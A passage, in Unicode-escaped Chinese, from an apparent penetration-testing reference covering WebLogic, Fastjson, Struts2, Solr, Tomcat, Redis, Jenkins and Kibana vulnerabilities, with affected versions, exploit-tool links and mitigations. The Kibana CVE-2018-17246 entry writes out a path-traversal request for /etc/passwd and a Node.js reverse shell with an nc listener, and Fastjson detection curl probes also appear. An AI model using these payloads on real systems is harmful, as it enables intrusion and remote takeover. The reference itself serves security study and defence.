, \u6216\u8005\u9650\u5236\u53ef\u8bbf\u95eeT3\u7aef\u53e3\u7684IP\u6765\u6e90 Weblogic XMLDecoder\u53cd\u5e8f\u5217\u5316 \u6f0f\u6d1e\u7b80\u4ecb WebLogic \u4e2d \u9ed8 \u8ba4 \u5305 \u542b \u7684 wls-wast \u4e0e wls9_async_response war \u5305 \uff0c \u7531 \u4e8e \u4ee5 \u4e0a WAR \u5305 \u91c7 \u7528 XMLDecoder \u53cd \u5e8f \u5217 \u5316 \u673a \u5236 \u6765 \u5904 \u7406 \u53d1 \u9001 \u8fc7 \u6765 \u7684 XML \u6570 \u636e \uff0c \u8fdc \u7a0b \u6076 \u610f \u653b \u51fb \u8005 \u53ef \u4ee5 \u901a \u8fc7 \u53d1 \u9001 \u7cbe \u5fc3 \u6784 \u9020 \u7684 HTTP \u8bf7\u6c42\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff0c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u7684\u6743\u9650\u3002\u4e5f\u5c31 \u662f\u8bf4\uff0c\u653b\u51fb\u8005\u80fd\u591f\u76f4\u63a5\u83b7\u53d6\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u8fdb\u884c\u6570\u636e\u7a83\u53d6\uff0c\u8fdb\u800c\u751a\u81f3 \u4f1a\u5a01\u80c1\u53d7\u5bb3\u8005\u7684\u5185\u7f51\u5b89\u5168\u3002 \u5f71\u54cd\u8303\u56f4 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 /wls-wsat/CoordinatorPortType /async/AsyncResponseService /async/AsyncResponseServiceSoap12 \u6f0f\u6d1e\u590d\u73b0 WebLogic XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-10271\uff09 https://blog.csdn.net/u013622866/article/details/104872747 WebLogic-XMLDecoder\u53cd\u5e8f\u5217\u5316\u5206\u6790 https://hu3sky.github.io/2019/10/16/weblogic/ \u5229\u7528\u5de5\u5177 weblogicScanner https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u901a\u8fc7\u8bbf\u95ee\u7b56\u7565\u63a7\u5236\u7981\u6b62\u5916\u90e8/_async/* \u53ca /wls-wsat/*\u8def\u5f84\u7684URL\u8bbf\u95ee \u5220\u9664\u5bf9\u5e94war\u5305\u5e76\u91cd\u542f webLogic \u9650\u5236\u6e90IP\u5bf9\u5e94 weblogic 7001\u7aef\u53e3\u7684\u8bbf\u95ee Fastjson\u53cd\u5e8f\u5217\u5316 \u00b6 Fastjson 1.2.22 - 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb FastJson\u662falibaba\u7684\u4e00\u6b3e\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u53ef\u7528\u4e8e\u5c06Java\u5bf9\u8c61\u8f6c\u6362 \u4e3a\u5176JSON\u8868\u793a\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5c06JSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u7b49\u6548\u7684Java\u5bf9 \u8c61\u3002fastjson\u5728\u89e3\u6790json\u7684\u8fc7\u7a0b\u4e2d\uff0c\u652f\u6301\u4f7f\u7528autoType\u6765\u5b9e\u4f8b\u5316\u67d0\u4e00\u4e2a \u5177 \u4f53 \u7684 \u7c7b \uff0c \u5e76 \u8c03 \u7528 \u8be5 \u7c7b \u7684 set/get \u65b9 \u6cd5 \u6765 \u8bbf \u95ee \u5c5e \u6027 \u3002 \u5728 Java 8u102\u73af\u5883\u4e0b\uff0c\u6ca1\u6709com.sun.jndi.rmi.object.trustURLCodebase\u7684\u9650 \u5236\uff0c\u53ef\u4ee5\u4f7f\u7528com.sun.rowset.JdbcRowSetImpl\u7684\u5229\u7528\u94fe\uff0c\u501f\u52a9JNDI \u6ce8\u5165\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5f71\u54cd\u8303\u56f4 Fastjson 1.2.22 - 1.2.24 \u6f0f\u6d1e\u7279\u5f81 \u5982\u679c\u7ad9\u70b9\u6709\u539f\u59cb\u62a5\u9519\u56de\u663e\uff0c\u53ef\u4ee5\u7528\u4e0d\u95ed\u5408\u82b1\u62ec\u53f7\u7684\u65b9\u5f0f\u8fdb\u884c\u62a5\u9519\u56de\u663e\uff0c \u62a5 \u9519 \u4e2d \u5f80 \u5f80 \u4f1a \u6709 fastjson \u7684 \u5b57 \u6837 .(vulhub \u73af \u5883 \u4e0d \u9002 \u7528 \uff09 \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{\"name\":\"success\", \"age\":20' \u53ef \u4ee5 \u901a \u8fc7 DNS \u56de \u663e \u7684 \u65b9 \u5f0f \u68c0 \u6d4b \u540e \u7aef \u662f \u5426 \u4f7f \u7528 Fastjson \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0' Java \u7cfb Json \u5904\u7406\u57fa\u672c\u53ea\u6709 Fastjson \u548c Jackson\uff0c\u8ffd\u52a0\u4e00\u4e2a\u968f\u673a key\u65f6jackson\u4f1a\u62a5\u9519\u3002 \u5bf9 \u4f7f \u7528 fastjson \u7684 \u3002 Fastjson < 1.2.60 \u5728 \u53d6 \u4e0d \u5230 \u503c \u7684 \u65f6 \u5019 \u4f1a \u586b \u5145 \\u001a , \u5728 1.2.60 \u8fdb \u884c \u4e86 \u4fee \u590d , \u5bf9 \\x \u540e \u9762 \u7684 \u5b57 \u7b26 \u8fdb \u884c \u662f \u5426 \u4e3a 16 \u8fdb \u5236 \u5141 \u8bb8 \u5b57 \u7b26 (0-9a-fA-F) \u7684\u6821\u9a8c,\u6240\u4ee5\u8fd9\u91cc\u5c31\u53ef\u4ee5\u624b\u52a8 padding ,\u6784\u9020\u4e00\u4e2a\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u3002 \u6f0f\u6d1e\u590d\u73b0 fastjson <= 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 https://www.secpulse.com/archives/73508.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\u8bb0\u5f55 https://www.cnblogs.com/tr1ple/p/11431543.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6df1\u5ea6\u5206\u6790 https://www.anquanke.com/post/id/211035 \u5982\u4f55\u5229\u7528 https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B 4%9E%E5%A4%8D%E7%8E%B0/ \u9632\u62a4\u65b9\u6cd5 \u76f4\u63a5\u4e0b\u8f7d\u4e0d\u53d7\u5f71\u54cd\u7684\u65b0\u7248\u672c\u963f\u91cc\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u516c\u544a\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237 \u7acb \u523b \u5347 \u7ea7 \u5230 1.2.28/1.2.29 \u6216\u66f4\u9ad8\u7684\u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a http://repo1.maven.org/maven2/com/alib aba/fastjson/1.2.29/ Struts\u7cfb\u5217\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Apache Struts2 \u4f5c \u4e3a \u4e16 \u754c \u4e0a \u6700 \u6d41 \u884c \u7684 Java Web \u670d\u52a1\u5668\u6846\u67b6\u4e4b\u4e00\uff0c\u4ece\u51fa\u73b0\u6f0f\u6d1e\u81f3\u4eca\u867d\u7136\u6709\u4e9b\u5e74\u5934\uff0c\u4f46\u662f\u4ecd\u7136\u6ca1\u6709\u6d88\u5931\u3002 \u5f71\u54cd\u7ec4\u4ef6 Struts \u6f0f\u6d1e\u590d\u73b0 Struts2 \u5386\u53f2 RCE \u6f0f\u6d1e\u56de\u987e\u4e0d\u5b8c\u5168\u7cfb\u5217 https://rickgray.me/2016/05/06/review-struts2-remote-command \ufffeexecution-vulnerabilities/ \u6d45\u8c08struts2\u5386\u53f2\u4e0a\u7684\u9ad8\u5371\u7a81\u7834 https://www.anquanke.com/post/id/86757 strut2\u5404\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u6574\u7406 https://www.zybuluo.com/Dukebf/note/821989 \u5229\u7528\u5de5\u5177 HatBoy/Struts2-Scan https://github.com/HatBoy/Struts2-Scan Struts2\u5947\u8469\u73af\u5883\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5de5\u5177 https://www.cnblogs.com/k8gege/p/10261217.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u5efa\u8bae\u4f7f\u7528Struts Solr\u7cfb\u5217 \u00b6 \u7ec4\u4ef6\u63cf\u8ff0 Apache Solr\u662f\u4e00\u4e2a\u9ad8\u5ea6\u53ef\u9760\u3001\u53ef\u4f38\u7f29\u548c\u5bb9\u9519\u7684\uff0c\u63d0\u4f9b\u5206\u5e03\u5f0f\u7d22\u5f15\u3001\u590d\u5236\u548c\u8d1f\u8f7d \u5e73\u8861\u67e5\u8be2\u3001\u81ea\u52a8\u6545\u969c\u8f6c\u79fb\u548c\u6062\u590d\u3001\u96c6\u4e2d\u914d\u7f6e\u7b49\u529f\u80fd\u7684\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668 \u3002Solr\u4e3a\u4e16\u754c\u4e0a\u8bb8\u591a\u6700\u5927\u7684\u4e92\u8054\u7f51\u7ad9\u70b9\u63d0\u4f9b\u641c\u7d22\u548c\u5bfc\u822a\u529f\u80fd\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002Apache Solr \u4e2d \u5b58 \u50a8 \u7684 \u8d44 \u6e90 \u662f \u4ee5 Document \u4e3a\u5bf9\u8c61\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6bcf\u4e2a\u6587\u6863\u7531\u4e00\u7cfb\u5217\u7684 Field \u6784\u6210\uff0c\u6bcf\u4e2a Field \u8868 \u793a \u8d44 \u6e90 \u7684 \u4e00 \u4e2a \u5c5e \u6027 \u3002 Solr \u4e2d \u7684 \u6bcf \u4e2a Document \u9700\u8981\u6709\u80fd\u552f\u4e00\u6807\u8bc6\u5176\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5c5e\u6027\u7684\u540d\u5b57\u662f id\uff0c\u5728 Schema \u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\uff1a id \u5f71\u54cd\u7ec4\u4ef6 solr \u6f0f\u6d1e\u590d\u73b0 Solr\u7cfb\u5217\u6f0f\u6d1e\u590d\u73b0 https://www.jianshu.com/p/43e7f13e2058 \u5229\u7528\u5de5\u5177 k8gege/SolrExp https://github.com/k8gege/SolrExp 1135/solr_exploit https://github.com/1135/solr_exploit \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u8981\u5bf9\u5916\u5f00\u653e\u654f\u611f\u7aef\u53e3 Tomcat\u7c7b \u00b6 Tomcat \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938) \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Tomcat \u662f \u5e38 \u89c1 \u7684 Web \u5bb9 \u5668 , \u7528 \u6237 \u91cf \u975e \u5e38 \u5de8 \u5927 , Tomcat 8009 ajp\u7aef\u53e3\u4e00\u76f4\u662f\u9ed8\u8ba4\u5f00\u653e\u7684 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u6f0f\u6d1e\u7279\u5f81 tomcat/8009/ajp \\x04\\x01\\xf4\\x00\\x15 \u6f0f\u6d1e\u590d\u73b0 CVE-2020-1938 \u5e7d \u7075 \u732b ( GhostCat ) Tomcat-Ajp \u534f\u8bae\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6/JSP\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://www.guildhab.top/?p=2406 Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://yinwc.github.io/2020/03/01/CVE-2020-1938/ CVE-2020-1938:Tomcat AJP\u534f\u8bae\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/ \u68c0\u6d4b\u5de5\u5177 bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi \ufffeScanner \u957f\u4ead\u79d1\u6280\u68c0\u6d4b\u5de5\u5177 https://www.chaitin.cn/zh/ghostcat#download \u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u4e3a\u6700\u65b0\u7248\u672c \u82e5 \u4e0d \u9700 \u8981 \u4f7f \u7528 Tomcat AJP \u534f \u8bae \uff0c \u53ef \u76f4 \u63a5 \u5173 \u95ed AJP Connector\uff0c\u6216\u5c06\u5176\u76d1\u542c\u5730\u5740\u6539\u4e3a\u4ec5\u76d1\u542c\u672c\u673alocalhost\u3002 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Apache Tomcat\u53d1\u5e03\u901a\u544a\u79f0\u4fee\u590d\u4e86\u4e00\u4e2a\u6e90\u4e8e\u6301\u4e45\u5316Session\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \uff08CVE-2020-9484\uff09\u3002 \u6f0f\u6d1e\u6761\u4ef6\u6bd4\u8f83\u82db\u523b\uff1a tomcat\u5fc5\u987b\u542f\u7528session\u6301\u4e45\u5316\u529f\u80fdFileStore tomcat/lib \u6216 \u8005 WEB-INF/lib \u76ee \u5f55 \u4e0b \u7684 \u4f9d \u8d56 \u5b58 \u5728 \u53ef \u7528 \u7684 gadget 3. \u5728\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u5df2\u77e5\u8def\u5f84\u6587\u4ef6\u5185\u5bb9\u53ef\u63a7 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 10.x < 10.0.0-M5 Apache Tomcat 9.x < 9.0.35 Apache Tomcat 8.x < 8.5.55 Apache Tomcat 7.x < 7.0.104 \u6f0f\u6d1e\u4f9d\u8d56\u6761\u4ef6 \u914d\u7f6esession\u6301\u4e45\u5316 conf/context.xml \u90e8\u7f72Gadgets jar\u5305 \u4e0b\u8f7dcommons-collections4-4.0.jar \u5e76\u653e\u5728tomcat lib/\u76ee\u5f55\u4e0b \u6f0f\u6d1e\u590d\u73b0 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/12931427.html CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://blog.csdn.net/Jietewang/article/details/106462903 \u6f0f\u6d1e\u5229\u7528 tomcat-cluster-session-sync-exp https://github.com/threedr3am/tomcat-cluster-session-sync-exp \u9632\u62a4\u65b9\u6cd5 Apache Tomcat\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u590d\u4e0a\u8ff0\u6f0f\u6d1e\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7 \u8fdb\u884c\u9632\u62a4\u3002\u4e0d\u65b9\u4fbf\u5347\u7ea7\u7684\u7528\u6237\uff0c\u8fd8\u53ef\u4ee5\u6682\u65f6\u7981\u7528FileStore\u529f\u80fd\uff0c\u6216\u8005 \u5355\u72ec\u914d\u7f6esessionAttributeValueClassNameFilte\u7684\u503c\u6765\u786e\u4fdd\u53ea\u6709\u7279\u5b9a \u5c5e\u6027\u7684\u5bf9\u8c61\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u3002 Redis\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u90e8\u5206 Redis \u7ed1\u5b9a\u5728 0.0.0.0:6379 \uff0c\u5e76\u4e14\u6ca1\u6709\u5f00\u542f\u8ba4\u8bc1\uff08\u8fd9\u662f Redis \u7684\u9ed8\u8ba4\u914d\u7f6e\uff09\uff0c\u5982\u679c\u6ca1\u6709\u8fdb\u884c\u91c7\u7528\u76f8\u5173\u7684\u7b56\u7565\uff0c\u6bd4\u5982\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u907f \u514d \u5176 \u4ed6 \u975e \u4fe1 \u4efb \u6765 \u6e90 ip \u8bbf \u95ee \u7b49 \uff0c \u5c06 \u4f1a \u5bfc \u81f4 Redis \u670d\u52a1\u76f4\u63a5\u66b4\u9732\u5728\u516c\u7f51\u4e0a\uff0c\u5bfc\u81f4\u5176\u4ed6\u7528\u6237\u53ef\u4ee5\u76f4\u63a5\u5728\u975e\u6388\u6743\u60c5\u51b5\u4e0b\u76f4\u63a5\u8bbf \u95ee Redis \u670d\u52a1\u5e76\u8fdb\u884c\u76f8\u5173\u64cd\u4f5c\u3002\u5229\u7528 Redis \u81ea\u8eab\u7684\u63d0\u4f9b\u7684 config \u547d\u4ee4\uff0c\u53ef\u4ee5\u8fdb\u884c\u5199\u6587\u4ef6\u64cd\u4f5c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6210\u529f\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u5199\u5165\u76ee\u6807\u670d \u52a1 \u5668 \u7684 /root/.ssh \u6587 \u4ef6 \u5939 \u7684 authotrized_keys \u6587\u4ef6\u4e2d\uff0c\u8fdb\u800c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5bf9\u5e94\u7684\u79c1\u94a5\u767b\u5f55\u76ee\u6807\u670d\u52a1\u5668\u3002 \u5f71\u54cd\u7ec4\u4ef6 Redis \u6f0f\u6d1e\u7279\u5f81 6379\u7aef\u53e3 \u6f0f\u6d1e\u590d\u73b0 Redis \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u603b\u7ed3 http://www.alloyteam.com/2017/07/12910/ Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u603b\u7ed3 https://fragrant10.github.io/2019/02/13/Redis%E6%9C%AA%E6%8 E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6 %B4%9E%E6%80%BB%E7%BB%93.html \u590d\u73b0\u5751\u70b9\u5206\u6790 redis\u6f0f\u6d1e\u5229\u7528 https://www.jianshu.com/p/2f56a58a1450 redis 4.x/5.x\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff08\u4ee5\u53ca\u4e00\u4e9b\u73af\u5883\u642d\u5efa\u7684\u5751\uff09(7\u670818\u66f4\u65b0\uff09 http://www.mucn.site/index.php/Termux/210.html \u9632\u62a4\u65b9\u6cd5 redis\u6570\u636e\u5e93\u6f0f\u6d1e\u9632\u62a4 https://www.cnblogs.com/rinack/p/11099854.html redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u7684\u5229\u7528\u548c\u9632\u62a4 https://carey.akhack.com/2020/05/07/Redis%E6%9C%AA%E6%8E %88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6% B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9 %98%B2%E6%8A%A4/ Zabbix\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Zabbix\u7ec4\u4ef6\u4e3b\u8981\u5b58\u5728\u6ce8\u5165/\u5f31\u53e3\u4ee4/\u547d\u4ee4\u6267\u884c\u7b49\u7c7b\u578b\u7684\u6f0f\u6d1e\u3002 \u5f71\u54cd\u7ec4\u4ef6 Zabbix \u6f0f\u6d1e\u590d\u73b0\uff1a \u4fe1\u606f\u6536\u96c6 - Zabbix - \u6f0f\u6d1e - \u6c47\u603b https://www.cnblogs.com/AtesetEnginner/p/12641747.html Zabbix\uff08\u5206\u5e03\u5f0f\u7cfb\u7edf\u76d1\u89c6\uff09\u6f0f\u6d1e\u5b66\u4e60 https://www.jianshu.com/p/85e3b0266158 \u8bb0\u4e00\u6b21zabbix\u5b89\u88c5\u53ca\u6f0f\u6d1e\u5229\u7528getshell\u5168\u8fc7\u7a0b https://xz.aliyun.com/t/6874 Zabbix \u6700\u65b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u53ca EXP \u2013 Jamin Zhang https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection \ufffeVulnerability-and-EXP/ \u6700\u65b0Zabbix\u6f0f\u6d1e\u53ca\u5176\u5229\u7528\u59ff\u52bf\uff08\u9644EXP\uff09 https://zhuanlan.zhihu.com/p/22082375 \u9632\u62a4\u65b9\u6cd5 https://www.bbsmax.com/A/QV5ZqlDeJy/ Jenkins\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Jenkins \u662f \u5e38 \u89c1 \u7684 CI/CD \u670d \u52a1 \u5668 , \u6700\u5e38\u89c1\u7684\u5c31\u662f\u7206\u7834\u5f31\u53e3\u4ee4\u7136\u540e\u4f7f\u7528groovy\u6267\u884c\u547d\u4ee4 \u5f71\u54cd\u7ec4\u4ef6 Jenkins \u6f0f\u6d1e\u7279\u5f81 Jenkins \u6f0f\u6d1e\u590d\u73b0 Jenkins\u6f0f\u6d1e\u96c6\u5408\u590d\u73b0 https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4 %9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Jenkins\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5206\u6790 https://www.freebuf.com/news/178808.html \u6f0f\u6d1e\u5229\u7528 blackye/Jenkins: Jenkins\u6f0f\u6d1e\u63a2\u6d4b\u3001\u7528\u6237\u6293\u53d6\u7206\u7834 https://github.com/blackye/Jenkins gquere/pwn_jenkins: Notes about attacking Jenkins servers https://github.com/gquere/pwn_jenkins Jenkins\u810f\u725b\u6f0f\u6d1eFRP\u5185\u7f51\u63d0\u6743 https://www.freebuf.com/articles/web/215183.html \u5229\u7528\u6280\u5de7 \u53ef \u4ee5 \u5728 Jenkins \u5904 \u8fdb \u884c \u5185 \u7f51 \u4fe1 \u606f \u6536 \u96c6 , \u83b7\u53d6\u7684\u8d26\u53f7\u901a\u5e38\u4e5f\u662f\u5f00\u53d1/\u8fd0\u7ef4\u7ea7\u522b\u7684, \u6743\u9650\u76f8\u5bf9\u8f83\u5927\u3002 \u9632\u62a4\u65b9\u6cd5 \u8bbe\u7f6e\u5f3a\u53e3\u4ee4\u5c3d\u91cf\u4e0d\u8981\u5f00\u653e\u5230\u516c\u7f51\u9650\u5236\u6765\u6e90IP\u5347\u7ea7\u5230\u6700\u65b0\u7248 Kibana\u76f8\u5173 \u00b6 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2019-7609) \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Kibana \u662f\u4e3a Elasticsearch\u8bbe\u8ba1\u7684\u5f00\u6e90\u5206\u6790\u548c\u53ef\u89c6\u5316\u5e73\u53f0\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 Kibana \u6765 \u641c \u7d22 \uff0c \u67e5 \u770b \u5b58 \u50a8 \u5728 Elasticsearch \u7d22\u5f15\u4e2d\u7684\u6570\u636e\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u3002\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u5b9e\u73b0\u9ad8\u7ea7\u7684\u6570\u636e\u5206\u6790\u548c\u53ef\u89c6\u5316 \uff0c\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 \u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u53ef\u4ee5\u901a\u8fc7Timelion\u7ec4\u4ef6\u4e2d\u7684JavaScript\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \uff0c\u5411Kibana\u53d1\u8d77\u76f8\u5173\u8bf7\u6c42\uff0c\u4ece\u800c\u63a5\u7ba1\u6240\u5728\u670d\u52a1\u5668\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb \u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c Kibana < 6.6.1 Kibana < 5.6.15 \u68c0\u6d4b\u65b9\u6cd5 \u6587\u4e2d\u7ed9\u51fa\u4e86POC https://dylan903.github.io/2019/10/20/kibana-rce-lou-dong-fu-xian/ \u6f0f\u6d1e\u590d\u73b0 CVE-2019-7609 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u65b9\u6cd5\u548c\u6f0f\u6d1e\u539f\u7406\u5206\u6790 https://cloud.tencent.com/developer/article/1535121 CVE-2019-7609 Kibana \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 http://blog.leanote.com/post/snowming/2cd6256df61d \u6f0f\u6d1e\u5229\u7528 jas502n/kibana-RCE https://github.com/jas502n/kibana-RCE \u5751\u70b9 \u90e8 \u7f72 \u8fc7 \u7a0b \u4e2d \u5982 \u679c \u51fa \u73b0 Kibana server is not ready yet,\u90a3\u4e48\u4f60\u662f\u9700\u8981\u786e\u5b9a\u4e0b \u4f60\u7684kibana\u4e0eelasticsearch\u7248\u672c\u662f\u5426\u4e00\u81f4 es\u8981\u7528\u975eroot\u7528\u6237\u542f\u52a8\uff0c\u5426\u5219\u4f1a\u62a5can not run elasticsearch as root\u9519\u8bef\u3002 \u9632\u5fa1\u65b9\u6cd5 \u5347\u7ea7Kibana\u81f3\u65b0\u7248\u672c Kibana\u6f0f\u6d1eCVE-2018-17246 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6b64\u6f0f\u6d1e\u51fa\u73b0\u5728Kibana\u63a7\u5236\u53f0\uff08Console\uff09\u63d2\u4ef6\u4e2d\uff0c\u63a7\u5236\u53f0\u63d2\u4ef6\u662fKIban a\u7684\u57fa\u672c\u63d2\u4ef6\uff0c\u4e5f\u5c31\u662fKibana\u5fc5\u88c5\u7684\u63d2\u4ef6\u3002\u5f53\u524delastic\u6700\u65b0\u7248\u672c\u4e3a6.5 \uff0c\u53ef\u4ee5\u8bf4\u5927\u90e8\u5206elk\u7684\u7ec4\u4ef6\u4f1a\u5b58\u5728\u6b64\u95ee\u9898\uff0c\u4f46\u662f\u6b64\u95ee\u9898\u5229\u7528\u96be\u70b9\u5728\u4e8e\u5982 \u4f55\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u672c\u5730\u6587\u4ef6\u3002 \u5f71\u54cd\u7248\u672c ElasticSearch Kibana < 6.4.3 ElasticSearch Kibana < 5.6.13 \u5229\u7528\u65b9\u6cd5 \u8bfb\u6587\u4ef6\u64cd\u4f5c http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd \u53cd\u5f39shell\u5728kibana\u7684\u673a\u5668\u521b\u5efa /tmp/shell.js (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"192.168.1.2\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); \u8bf7\u6c42\u5305\u542b\u521a\u521a\u521b\u5efa\u7684shell\uff1a http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js \u672c\u5730\u76d1\u542c\uff1a nc -l 8080 -v \u6f0f\u6d1e\u590d\u73b0 Elasticsearch \u6838\u5fc3\u63d2\u4ef6Kibana \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790\uff08CVE-2018- 17246\uff09 https://www.anquanke.com/post/id/168291 ELK LFI CVE-2018-17246 https://wh0ale.github.io/2018/12/18/2018-12-18- ELK%20LFI%20CVE-2018-17246/ \u5751\u70b9 \u6700\u7ec8\u6f0f\u6d1e\u7684\u5f71\u54cd\u5173\u952e\u5728\u4e8e\u5982\u4f55\u521b\u5efashell\u6587\u4ef6\u3002 \u4fee\u590d\u5efa\u8bae \u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8865\u4e01\u83b7\u53d6\u94fe\u63a5: https://access.redhat.com/security/cve/cve-2018-17246 \u6cdb\u5faeOA\u76f8\u5173 \u00b6 \u6cdb\u5faeOA\u7cfb\u7edf\u591a\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb 